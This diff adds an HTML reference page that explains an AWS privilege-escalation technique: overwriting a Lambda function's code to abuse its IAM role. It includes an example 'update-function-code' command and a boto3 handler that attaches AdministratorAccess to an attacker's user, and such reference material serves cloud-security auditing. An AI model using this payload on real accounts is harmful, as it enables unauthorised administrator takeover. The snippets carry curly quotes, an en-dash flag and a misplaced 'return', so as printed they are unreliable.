@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Updating The Code of an Existing Lambda Function</title>
+</head><body><b>Description: </b>An attacker with the <u>lambda:UpdateFunctionCode</u>&nbsp;permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role. They would then need to wait for it to be invoked if they were not able to do so directly, but if it already exists, there is likely some way that it will be invoked.<br/>
+&nbsp;<br/>
+An example command to exploit this method might look like this:<br/>
+<i>aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip</i><br/>
+&nbsp;<br/>
+Where the associated .zip file contains code that utilizes the Lambda’s role. An example could include the code snippet from methods 11 and 12:<br/>
+<br/>
+import boto3<br/>
+def lambda_handler(event, context):<br/>
+&nbsp; &nbsp; client = boto3.client(‘iam’)<br/>
+&nbsp; &nbsp; response = client.attach_user_policy(UserName=’my_username’, PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’)<br/>
+<br/>
+return response<br/>
+<br/>
+<br/>
+&nbsp;<br/>
+<b>Potential Impact: </b>This would give an attacker access to the privileges associated with the Lambda service role that is attached to that function, which could range from no privilege escalation to full administrator access to the account.<br/>
+&nbsp; &nbsp;</body></html>
